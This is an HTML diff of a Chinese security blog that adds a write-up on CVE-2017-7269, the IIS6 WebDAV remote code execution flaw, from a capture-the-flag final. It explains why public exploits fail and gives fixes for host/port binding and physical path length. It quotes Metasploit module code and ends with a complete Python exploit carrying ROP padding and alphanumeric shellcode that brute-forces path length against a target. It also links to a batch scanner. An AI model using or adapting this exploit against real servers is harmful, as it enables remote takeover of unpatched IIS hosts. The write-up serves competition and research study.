@@ -494,6 +494,286 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.admintony.com/CVE-2017-7269.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="AdminTony">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="AdminTony's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/CVE-2017-7269.html" itemprop="url">CVE-2017-7269</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-22T00:46:23-07:00">
+                2018-09-22
+              </time>
+            
+			
+			
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/比赛/" itemprop="url" rel="index">
+                    <span itemprop="name">比赛</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/比赛/巅峰极客/" itemprop="url" rel="index">
+                    <span itemprop="name">巅峰极客</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2,438 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  11 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><img src="https://blog-1252108140.cosbj.myqcloud.com/201809/1537699880.7428684.png" alt=""></p>
+<p>&emsp;&emsp;上周参加巅峰极客决赛的时候，靶场中很多中小型的网站都是用的IIS6的WEB容器，并且开着WEBDAV，但是直接用msf的<code>iis_webdav_scstoragepathfromurl</code>却无法利用成功，因此总结一下，以免下次再遇到这样尴尬的场面。</p>
+<h1 id="失败原因"><a href="#失败原因" class="headerlink" title="失败原因"></a>失败原因</h1><p>&emsp;&emsp;其实早在2017.03.31大佬zcgonvh已经给出了4种失败的原因了，当时没太在意，这次复现的过程中深刻的体会到了这些失败原因，并将大佬的4种失败原因分解成5种失败原因。</p>
+<h2 id="端口和域名绑定问题"><a href="#端口和域名绑定问题" class="headerlink" title="端口和域名绑定问题"></a>端口和域名绑定问题</h2><p>&emsp;&emsp;实际环境中，iis绑定的域名和端口可能不是默认的，比如：</p>
+<ul>
+<li>默认绑定</li>
+</ul>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201809/1537700449.7591515.png" alt=""></p>
+<ul>
+<li>非默认绑定</li>
+</ul>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201809/1537700484.268321.png" alt=""></p>
+<p>&emsp;&emsp;If头信息中的两个url是要求和站点绑定相匹配的，否则只能收到一个502。这里所说的相匹配指的是if头中url的port必须与站点绑定的端口相匹配，而if头中的域名只需要和host头保持一致就好。</p>
+<ul>
+<li>失败情况 ：POC中if头里面的域名及端口与绑定不一致时。</li>
+</ul>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201809/1537700735.049918.png" alt=""></p>
+<p>&emsp;&emsp;上图是端口不匹配的情况，下图是域名不匹配的情况</p>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201809/1537765093.2809324.png" alt=""></p>
+<ul>
+<li>成功情况 ：POC中if头里面的域名及端口与绑定一致时。（端口与实际端口一致，host的值与if中的域名一致）</li>
+</ul>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201809/1537700798.727872.png" alt=""></p>
+<h2 id="物理路径"><a href="#物理路径" class="headerlink" title="物理路径"></a>物理路径</h2><p>&emsp;&emsp;根据<a href="http://whereisk0shl.top/cve-2017-7269-iis6-interesting-exploit.html" target="_blank" rel="noopener">CVE-2017-7269 IIS6.0远程代码执行漏洞分析及Exploit</a>中提到：POC中<code>If</code>头中的第一个URL会被解析成物理路径，默认情况下是<code>C:\Inetpub\wwwroot\</code>，在覆盖缓冲区的时候填充的字符长度要根据物理路径的长度来决定，且<code>物理路径长度 + 填充字符的个数 = 114</code>。POC中的是按照默认的物理路径（19位）来计算填充字符的长度的，当物理路径的长度不为19位的时候就会收到一个500。（这里物理路径长度计算方法要加上最后的<code>\</code>）</p>
+<h3 id="物理路径长度-lt-19位"><a href="#物理路径长度-lt-19位" class="headerlink" title="物理路径长度&lt;19位"></a>物理路径长度&lt;19位</h3><ul>
+<li>失败情况 ：物理路径长度小于19位。</li>
+</ul>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201809/1537709498.6400754.png" alt=""></p>
+<ul>
+<li>成功情况 ：物理路径长度小于19位，且增加POC中padding的长度。</li>
+</ul>
+<p>&emsp;&emsp;物理路径为<code>c:\asp\</code>其长度为7，因此POC需要增加12个a。</p>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201809/1537709989.6624866.png" alt=""></p>
+<h3 id="物理路径长度-gt-19位"><a href="#物理路径长度-gt-19位" class="headerlink" title="物理路径长度&gt;19位"></a>物理路径长度&gt;19位</h3><p>&emsp;&emsp;直接引用zcgonvh大佬的原话：“ROP和stackpivot前面的padding实际上为UTF8编码的字符，每三个字节解码后变为两个字节的UTF16字符，在保证Exp不出错的情况下，有0x58个字符是没用的。所以可以将前0x108个字节删除，换成0x58个a或b。”</p>
+<p>&emsp;&emsp;所以大概的POC是这样的：</p>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201809/1537725826.473578.png" alt=""></p>
+<p>&emsp;&emsp;物理路径为<code>C:\Inetpub\wwwroot\test\</code>长度为24位，因此需要padding <code>90</code>位，其中红框中<code>a</code>或<code>b</code>的个数为90。</p>
+<h3 id="爆破物理路径长度"><a href="#爆破物理路径长度" class="headerlink" title="爆破物理路径长度"></a>爆破物理路径长度</h3><p>&emsp;&emsp;这个漏洞利用的成功与否，也取决于是否知道物理路径的长度。物理路径的长度可以根据上面已知的信息，来进行爆破：</p>
+<ul>
+<li><p><code>物理路径长度 + 填充字符的个数 = 114</code></p>
+</li>
+<li><p>长度不匹配时返回500。</p>
+</li>
+</ul>
+<p>&emsp;&emsp;因为盘符占了3位字符（<code>c:\</code>），所以要爆破物理路径长度，可以将padding增加到111位，并依次减少，如果长度不匹配就返回500。判断长度的工具附在最后面。</p>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201809/1537728279.4797318.png" alt=""></p>
+<h2 id="多次执行错误shellcode"><a href="#多次执行错误shellcode" class="headerlink" title="多次执行错误shellcode"></a>多次执行错误shellcode</h2><p>&emsp;&emsp;多次执行错误的shellcode会覆盖很多不该覆盖的代码，从而导致正确的shellcode也执行也返回500，提示信息为：<code>参数不正确</code>，也可能什么都不返回。该问题在巅峰极客比赛中也遇到过，我们控制的靶机什么都没动一会儿就全站500了。</p>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201809/1537729677.0352328.png" alt=""></p>
+<h2 id="EXP执行成功后"><a href="#EXP执行成功后" class="headerlink" title="EXP执行成功后"></a>EXP执行成功后</h2><p>&emsp;&emsp;当exp执行成功一段时间之后(大概十分钟到二十分钟左右，其间无论有无访问，被windbg挂起的时间不算)，再对这个站点执行exp永远不会成功，同时返回400。</p>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201809/1537726819.1552343.png" alt=""></p>
+<p>&emsp;&emsp;遇到该问题的解决方案：</p>
+<ul>
+<li><p>1.找旁站，因为每个池都是独立的w3wp进程，换一个可能在其他池的进行尝试</p>
+</li>
+<li><p>2.等待w3wp重启</p>
+</li>
+</ul>
+<h2 id="Win03-x64"><a href="#Win03-x64" class="headerlink" title="Win03 x64"></a>Win03 x64</h2><p>&emsp;&emsp;Win03 x64并不多见，此类型的不能直接用网上的POC进行攻击。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><img src="https://blog-1252108140.cosbj.myqcloud.com/201809/1537733091.5755155.png" alt=""></p>
+<h1 id="MSF-Exploit"><a href="#MSF-Exploit" class="headerlink" title="MSF-Exploit"></a>MSF-Exploit</h1><h2 id="CVE-2017-7269"><a href="#CVE-2017-7269" class="headerlink" title="CVE-2017-7269"></a>CVE-2017-7269</h2><p>&emsp;&emsp;该exploit是我们比赛时albertchang找到的一个可以成功利用的exploit（后面我会提及那个不能用的exploit）。</p>
+<p>&emsp;&emsp;该exploit用法很简单，只需要填写域名和端口即可。</p>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201809/1537729892.3363013.png" alt=""></p>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201809/1537730349.7929342.png" alt=""></p>
+<p>&emsp;&emsp;但是其对非默认端口或非默认路径的站点却束手无策。</p>
+<p>&emsp;&emsp;看下此exploit的代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span></span></span><br><span class="line"><span class="function">    <span class="title">connect</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line">    buf1 = "If: &lt;http://localhost/aaaaaaa"</span><br><span class="line">    buf1 &lt;&lt; padding1</span><br><span class="line">    buf1 &lt;&lt; <span class="string">"&gt;"</span></span><br><span class="line">    buf1 &lt;&lt; <span class="string">" (Not &lt;locktoken:write1&gt;) &lt;http://localhost/bbbbbbb"</span></span><br><span class="line">    buf1 &lt;&lt; padding2</span><br><span class="line"></span><br><span class="line">    buf1 &lt;&lt; payload.encoded</span><br><span class="line"></span><br><span class="line">    sock.put(<span class="string">"PROPFIND / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 0\r\n#&#123;buf1&#125;&gt;\r\n\r\n"</span>)</span><br><span class="line"></span><br><span class="line">    handler</span><br><span class="line">    disconnect</span><br><span class="line">  end</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;可以看出这个exploit只是对POC进行了修改，将POC中的shellcode替换成了MSF的shellcode，因此在非默认绑定或者非默认物理路径的情况下利用不成功。</p>
+<h2 id="iis-webdav-scstoragepathfromurl完善前"><a href="#iis-webdav-scstoragepathfromurl完善前" class="headerlink" title="iis_webdav_scstoragepathfromurl完善前"></a>iis_webdav_scstoragepathfromurl完善前</h2><p>&emsp;&emsp;iis_webdav_scstoragepathfromurl是由zcgonvh大佬编写且国外的大佬完善过的，而我们这一小节写的是未进行完善的exploit。</p>
+<p>&emsp;&emsp;对于默认物理路径长度以及默认绑定情况：</p>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201809/1537730815.0260224.png" alt=""></p>
+<p>&emsp;&emsp;可以看到该exploit相比于第一个，增加了物理路径的长度和HttpHost两个字段，其中最主要的是物理路径的长度。</p>
+<p>&emsp;&emsp;对于默认物理路径长度以及默认绑定情况也可以利用成功，只需要修改物理路径的长度和端口即可，如下图。</p>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201809/1537731294.7145681.png" alt=""></p>
+<p>&emsp;&emsp;从代码看：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span></span></span><br><span class="line"><span class="function">    <span class="title">connect</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line">    http_host=datastore['HttpHost'] + ":" + datastore['RPORT'].to_s</span><br><span class="line">    </span><br><span class="line">    buf1 = <span class="string">"If: &lt;http://#&#123;http_host&#125;/"</span></span><br><span class="line">    buf1 &lt;&lt; <span class="string">"a"</span>*(<span class="number">114</span>-datastore[<span class="string">'PhysicalPathLength'</span>])</span><br><span class="line">    buf1 &lt;&lt; padding1</span><br><span class="line">    buf1 &lt;&lt; <span class="string">"&gt;"</span></span><br><span class="line">    buf1 &lt;&lt; <span class="string">" (Not &lt;locktoken:write1&gt;) &lt;http://#&#123;http_host&#125;/"</span></span><br><span class="line">    buf1 &lt;&lt; <span class="string">"b"</span>*(<span class="number">114</span>-datastore[<span class="string">'PhysicalPathLength'</span>])</span><br><span class="line">    buf1 &lt;&lt; padding2</span><br><span class="line"></span><br><span class="line">    buf1 &lt;&lt; payload.encoded</span><br><span class="line"></span><br><span class="line">    sock.put(<span class="string">"PROPFIND / HTTP/1.1\r\nHost: #&#123;http_host&#125;\r\nContent-Length: 0\r\n#&#123;buf1&#125;&gt;\r\n\r\n"</span>)</span><br><span class="line"></span><br><span class="line">    handler</span><br><span class="line">    disconnect</span><br><span class="line">  end</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;可以看出来zcgonvh大佬在编写Exploit的时候，把关于绑定和物理路径长度的问题都解决了，唯一不智能的一点就是需要自己输入物理路径的长度。</p>
+<h2 id="iis-webdav-scstoragepathfromurl"><a href="#iis-webdav-scstoragepathfromurl" class="headerlink" title="iis_webdav_scstoragepathfromurl"></a>iis_webdav_scstoragepathfromurl</h2><p>&emsp;&emsp;这个exploit是MSF自带的一个EXP，该EXP由zcgonvh大佬编写且国外的大佬完善过的，但是在比赛中以及这次写文章复现过程中都没有成功过一次。翻看了一下代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http_host = <span class="string">"#&#123;server_scheme&#125;://#&#123;server_name&#125;:#&#123;server_port&#125;"</span></span><br><span class="line">    vprint_status(<span class="string">"Using http_host #&#123;http_host&#125;"</span>)</span><br><span class="line"></span><br><span class="line">    min_path_len.upto(max_path_len) do |path_len|</span><br><span class="line">      vprint_status(<span class="string">"Trying path length of #&#123;path_len&#125;..."</span>)</span><br><span class="line"></span><br><span class="line">      begin</span><br><span class="line">        buf1 = <span class="string">"&lt;#&#123;http_host&#125;/"</span></span><br><span class="line">        buf1 &lt;&lt; rand_text_alpha(<span class="number">114</span> - path_len)</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;该exploit相对于zcgonvh编写的Exploit来说，添加了自动爆破物理路径长度的功能，其爆破开始的最小值和最大值是可以设置的。</p>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201809/1537729572.261053.png" alt=""></p>
+<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p><img src="https://blog-1252108140.cosbj.myqcloud.com/201809/1537732371.1537871.png" alt=""></p>
+<h1 id="物理路径长度爆破工具"><a href="#物理路径长度爆破工具" class="headerlink" title="物理路径长度爆破工具"></a>物理路径长度爆破工具</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="comment">#-----------</span></span><br><span class="line"><span class="comment"># 物理路径长度大于19位的POC</span></span><br><span class="line"><span class="comment">#-----------</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment">#-------------#</span></span><br><span class="line"><span class="comment">#   自定义区  #</span></span><br><span class="line"><span class="comment">#-------------#</span></span><br><span class="line"></span><br><span class="line">host = <span class="string">'192.168.27.136'</span> <span class="comment"># 域名</span></span><br><span class="line">port = <span class="number">81</span> <span class="comment"># 端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#-------------#</span></span><br><span class="line"><span class="comment"># 自定义区结束#</span></span><br><span class="line"><span class="comment">#-------------#</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(host,port,pathLen)</span>:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  </span><br><span class="line">    sock.connect((host,port))</span><br><span class="line">    host = <span class="string">"localhost123"</span></span><br><span class="line">    pay=<span class="string">'PROPFIND / HTTP/1.1\r\nHost: &#123;&#125;\r\nContent-Length: 0\r\n'</span>.format(host)</span><br><span class="line">    padding = <span class="string">'a'</span>*(<span class="number">114</span>-pathLen)</span><br><span class="line">    domain = <span class="string">"http://"</span>+host+<span class="string">":"</span>+str(port)+<span class="string">"/"</span></span><br><span class="line">    pay+=<span class="string">'If: &lt;'</span></span><br><span class="line">    pay+=domain</span><br><span class="line">    pay+=padding</span><br><span class="line">    pay+=<span class="string">'\xe6\xa9\xb7\xe4\x85\x84\xe3\x8c\xb4\xe6\x91\xb6\xe4\xb5\x86\xe5\x99\x94\xe4\x9d\xac\xe6\x95\x83\xe7\x98\xb2\xe7\x89\xb8\xe5\x9d\xa9\xe4\x8c\xb8\xe6\x89\xb2\xe5\xa8\xb0\xe5\xa4\xb8\xe5\x91\x88\xc8\x82\xc8\x82\xe1\x8b\x80\xe6\xa0\x83\xe6\xb1\x84\xe5\x89\x96\xe4\xac\xb7\xe6\xb1\xad\xe4\xbd\x98\xe5\xa1\x9a\xe7\xa5\x90\xe4\xa5\xaa\xe5\xa1\x8f\xe4\xa9\x92\xe4\x85\x90\xe6\x99\x8d\xe1\x8f\x80\xe6\xa0\x83\xe4\xa0\xb4\xe6\x94\xb1\xe6\xbd\x83\xe6\xb9\xa6\xe7\x91\x81\xe4\x8d\xac\xe1\x8f\x80\xe6\xa0\x83\xe5\x8d\x83\xe6\xa9\x81\xe7\x81\x92\xe3\x8c\xb0\xe5\xa1\xa6\xe4\x89\x8c\xe7\x81\x8b\xe6\x8d\x86\xe5\x85\xb3\xe7\xa5\x81\xe7\xa9\x90\xe4\xa9\xac'</span></span><br><span class="line">    pay+=<span class="string">'&gt;'</span></span><br><span class="line">    pay+=<span class="string">' (Not &lt;locktoken:write1&gt;) &lt;'</span></span><br><span class="line">    pay+=domain</span><br><span class="line">    pay+=padding</span><br><span class="line">    pay+=<span class="string">'\xe5\xa9\x96\xe6\x89\x81\xe6\xb9\xb2\xe6\x98\xb1\xe5\xa5\x99\xe5\x90\xb3\xe3\x85\x82\xe5\xa1\xa5\xe5\xa5\x81\xe7\x85\x90\xe3\x80\xb6\xe5\x9d\xb7\xe4\x91\x97\xe5\x8d\xa1\xe1\x8f\x80\xe6\xa0\x83\xe6\xb9\x8f\xe6\xa0\x80\xe6\xb9\x8f\xe6\xa0\x80\xe4\x89\x87\xe7\x99\xaa\xe1\x8f\x80\xe6\xa0\x83\xe4\x89\x97\xe4\xbd\xb4\xe5\xa5\x87\xe5\x88\xb4\xe4\xad\xa6\xe4\xad\x82\xe7\x91\xa4\xe7\xa1\xaf\xe6\x82\x82\xe6\xa0\x81\xe5\x84\xb5\xe7\x89\xba\xe7\x91\xba\xe4\xb5\x87\xe4\x91\x99\xe5\x9d\x97\xeb\x84\x93\xe6\xa0\x80\xe3\x85\xb6\xe6\xb9\xaf\xe2\x93\xa3\xe6\xa0\x81\xe1\x91\xa0\xe6\xa0\x83\xcc\x80\xe7\xbf\xbe\xef\xbf\xbf\xef\xbf\xbf\xe1\x8f\x80\xe6\xa0\x83\xd1\xae\xe6\xa0\x83\xe7\x85\xae\xe7\x91\xb0\xe1\x90\xb4\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81\xe9\x8e\x91\xe6\xa0\x80\xe3\xa4\xb1\xe6\x99\xae\xe4\xa5\x95\xe3\x81\x92\xe5\x91\xab\xe7\x99\xab\xe7\x89\x8a\xe7\xa5\xa1\xe1\x90\x9c\xe6\xa0\x83\xe6\xb8\x85\xe6\xa0\x80\xe7\x9c\xb2\xe7\xa5\xa8\xe4\xb5\xa9\xe3\x99\xac\xe4\x91\xa8\xe4\xb5\xb0\xe8\x89\x86\xe6\xa0\x80\xe4\xa1\xb7\xe3\x89\x93\xe1\xb6\xaa\xe6\xa0\x82\xe6\xbd\xaa\xe4\x8c\xb5\xe1\x8f\xb8\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81'</span></span><br><span class="line">    shellcode=<span class="string">'VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJIOPKSKPKPTKLITKKQDKU0G0KPKPM00QQXI8KPM0M0K8KPKPKPM0QNTKKNU397O00WRJKPSSI7KQR72JPXKOXPP3GP0PPP36VXLKM1VZM0LCKNSOKON2KPOSRORN3D35RND4NMPTD9RP2ENZMPT4352XCDNOS8BTBMBLLMKZOSROBN441URNT4NMPL2ERNS7SDBHOJMPNQ03LMLJPXNM1J13OWNMOS2H352CBKOJO0PCQFOUNMOB00NQNWNMP7OBP6OILMKZLMKZ130V15NMP2P0NQP7NMNWOBNV09KPM0A'</span></span><br><span class="line">    pay+=shellcode</span><br><span class="line">    pay+=<span class="string">'&gt;\r\n\r\n'</span></span><br><span class="line">    <span class="comment">#print pay</span></span><br><span class="line">    sock.send(pay)  </span><br><span class="line">    data = sock.recv(<span class="number">80960</span>)</span><br><span class="line">    <span class="comment">#print data</span></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    sock.close</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>,<span class="number">115</span>):</span><br><span class="line">        <span class="comment">#print(i)</span></span><br><span class="line">        data = exploit(host,port,i)</span><br><span class="line">        <span class="comment">#print data</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"CVE-2017-7269"</span> <span class="keyword">in</span> data:</span><br><span class="line">            print(<span class="string">"[+]Length is "</span>+ str(i))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">main()</span><br><span class="line"><span class="comment">#exploit(host,port,pathLen)</span></span><br></pre></td></tr></table></figure>
+<h1 id="批量检测工具"><a href="#批量检测工具" class="headerlink" title="批量检测工具"></a>批量检测工具</h1><ul>
+<li>爆破物理路径长度并检测漏洞</li>
+</ul>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201809/1537778045.160046.png" alt=""></p>
+<ul>
+<li>指定物理路径长度检测漏洞</li>
+</ul>
+<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201809/1537778109.713082.png" alt=""></p>
+<p>&emsp;&emsp;下载地址：<a href="https://github.com/admintony/Windows-Exploit/tree/master/IIS6_WebDAV_Scanner" target="_blank" rel="noopener">IIS6_WebDAV_Scanner</a></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.t00ls.net/thread-38987-1-1.html" target="_blank" rel="noopener">CVE-2017-7269的几个技巧及BUG修正</a></p>
+<p><a href="https://ht-sec.org/cve-2017-7269-hui-xian-poc-jie-xi/" target="_blank" rel="noopener">CVE-2017-7269回显POC</a></p>
+<p><a href="http://whereisk0shl.top/cve-2017-7269-iis6-interesting-exploit.html" target="_blank" rel="noopener">CVE-2017-7269 IIS6.0远程代码执行漏洞分析及Exploit</a></p>
+<p><a href="http://whereisk0shl.top/cve-2017-7269-iis6-interesting-exploit.html" target="_blank" rel="noopener">CVE-2017-7269 IIS6.0远程代码执行漏洞分析及Exploit</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://www.admintony.com/Java-System-Solutions-SSO-plugin-for-BMC-MyIT-跨站脚本漏洞.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2061,207 +2341,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.admintony.com/MySQL的逻辑运算符-and-or-xor-的工作机制.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="AdminTony">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="AdminTony's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/MySQL的逻辑运算符-and-or-xor-的工作机制.html" itemprop="url">MySQL的逻辑运算符(and_or_xor)的工作机制</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-27T22:38:16-07:00">
-                2018-04-27
-              </time>
-            
-			
-			
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/运维/" itemprop="url" rel="index">
-                    <span itemprop="name">运维</span>
-                  </a>
-                </span>
-
-                
-                
-                  ， 
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/运维/MySQL/" itemprop="url" rel="index">
-                    <span itemprop="name">MySQL</span>
-                  </a>
-                </span>
-
-                
-                
-                  ， 
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/运维/MySQL/and-or-xor/" itemprop="url" rel="index">
-                    <span itemprop="name">and_or_xor</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  1,629 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  7 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
